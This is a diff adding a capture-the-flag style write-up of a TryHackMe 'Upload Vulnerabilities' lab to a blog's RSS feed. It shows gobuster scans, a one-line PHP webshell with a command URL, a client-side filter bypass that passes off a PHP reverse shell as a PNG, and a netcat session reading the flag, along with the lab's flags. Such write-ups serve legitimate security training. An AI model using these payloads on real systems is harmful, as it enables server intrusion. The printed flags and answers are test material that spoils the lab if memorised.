@@ -42,6 +42,230 @@ When you inspect the elements of the page, you&rsquo;ll notice that the section 
 ]]></content:encoded>
     </item>
     <item>
+      <title>[THM] Upload Vulnerabilities</title>
+      <link>http://localhost:1313/thm-upload-vulnerabilities/</link>
+      <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/thm-upload-vulnerabilities/</guid>
+      <description>The ability to upload files to a server has become an integral part of how we interact with web applications. Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server.
+Overwriting Existing Files Open your web browser and navigate to overwrite.uploadvulns.thm. Your goal is to overwrite a file on the server with an upload of your own.
+What is the name of the image file which can be overwritten?</description>
+      <content:encoded><![CDATA[<p>The ability to upload files to a server has become an integral part of how we interact with web applications. Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server.</p>
+<h3 id="overwriting-existing-files">Overwriting Existing Files</h3>
+<p>Open your web browser and navigate to <code>overwrite.uploadvulns.thm</code>. Your goal is to overwrite a file on the server with an upload of your own.</p>
+<h4 id="what-is-the-name-of-the-image-file-which-can-be-overwritten">What is the name of the image file which can be overwritten?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>mountains.jpg</code></pre>
+<p>if no precautions are taken, we might be able to overwrite existing files on the server with a file with the same name.</p>
+<br>
+<h4 id="overwrite-the-image-what-is-the-flag-you-receive">Overwrite the image. What is the flag you receive?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}</code></pre>
+<p><img src="image.png" alt="alt text"></p>
+<br>
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+<p>There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: <code>webshells</code> and <code>reverse/bind shells</code>.</p>
+<p>Navigate to <code>shell.uploadvulns.thm</code> and complete the questions for this task.</p>
+<h4 id="run-a-gobuster-scan-on-the-website-using-the-syntax-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax. What directory looks like it might be used for uploads?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>/resources</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://shell.uploadvulns.thm
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/resources            <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 334<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://shell.uploadvulns.thm/resources/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 331<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://shell.uploadvulns.thm/assets/<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
+<br>
+<h4 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww--directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the <code>/var/www/ </code> directory of the server?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}</code></pre>
+<p>I created a file called <code>webshell.php</code> and uploaded to the website in order to get a webshell on the machine.</p>
+<p><code>echo '&lt;?php echo system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; webshell.php</code></p>
+<p><img src="image-1.png#center" alt="alt text"></p>
+<p>after uploading the file, navigate to <code>/var/www</code> directory and list files and directory by typing the following command on the browser:</p>
+<p><code>http://shell.uploadvulns.thm/resources/webshell.php?cmd=cd%20/var/www;%20ls;</code></p>
+<p><img src="image-2.png#center" alt="alt text"></p>
+<p>As we can see, there&rsquo;s the flag.txt file.</p>
+<p><img src="image-3.png#center" alt="alt text"></p>
+<br>
+<h4 id="filtering">Filtering</h4>
+<p>Up until now, we have been ignoring the counter-defences employed by web developers. Every website so far has been completely insecure. From here on out, we&rsquo;ll be looking at some of the defence mechanisms used to prevent malicious file uploads.</p>
+<p><strong><em>client-side</em></strong> filtering is trivially easy to by pass because the filtering is happening on our computer. client-side filtering by itself is a highly insecure method.</p>
+<p><strong><em>server-side</em></strong> filtering tends to be more difficult to by pass, as you don&rsquo;t have the code in front of you.</p>
+<p>Different kinds of filtering:</p>
+<ul>
+<li>Extension Validation</li>
+<li>File Type Filtering</li>
+<li>Magic Number Validation</li>
+<li>File Length Filtering</li>
+<li>File Name Filtering</li>
+<li>File Content Filtering</li>
+</ul>
+<br>
+<p>What is the traditionally predominant server-side scripting language?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>PHP</code></pre>
+<br>
+<p>When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>whitelist</code></pre>
+<br>
+<p>[Research] What MIME type would you expect to see when uploading a CSV file?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>text/csv</code></pre>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<br>
+<h3 id="bypassing-client-side-filtering">Bypassing Client-Side Filtering</h3>
+<p>There are four easy ways to bypass your average client-side file upload filter:</p>
+<ol>
+<li><em>Turn off Javascript in your browser</em></li>
+<li><em>Intercept and modify the incoming page</em></li>
+<li><em>Intercept and modify the file upload</em></li>
+<li><em>Send the file directly to the upload point</em></li>
+</ol>
+<p>Navigate to <code>java.uploadvulns.thm</code> and bypass the filter to get a reverse shell.</p>
+<h4 id="what-is-the-flag-in-varwww">What is the flag in <code>/var/www/</code>?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}</code></pre>
+<p>Let&rsquo;s use Gobuster to locate the upload directory name first by running the following command:</p>
+<p><code>gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://java.uploadvulns.thm
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/images               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 329<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://java.uploadvulns.thm/images/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 329<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://java.uploadvulns.thm/assets/<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
+<br>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<p>The website upload only accepts MIME type of <code>png</code> files. So I am going to create a file called <code>hello.png</code> but it contains the Pentest Monkey&rsquo;s <code>php-reverse-shell</code> code.</p>
+<br>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<br>
+<p>Before hitting the upload button, make sure <code>Intercept is on</code> on Burpsuite to capture the request and we&rsquo;re going to change the MIME type back to <code>text/x-php</code> and the file extension from <code>.png</code> to <code>.php</code>.
+<img src="image-8.png#center" alt="alt text">
+<img src="image-9.png#center" alt="alt text"></p>
+<br>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvp <span style="color:#fab387">443</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">443</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from overwrite.uploadvulns.thm <span style="color:#89dceb;font-weight:bold">[</span>10.10.41.54<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">54590</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux a73553061b26 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 04:52:35 up  4:07,  <span style="color:#fab387">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+]]></content:encoded>
+    </item>
+    <item>
       <title>[picoCTF] Binary Search</title>
       <link>http://localhost:1313/picoctf-binary-search/</link>
       <pubDate>Fri, 05 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
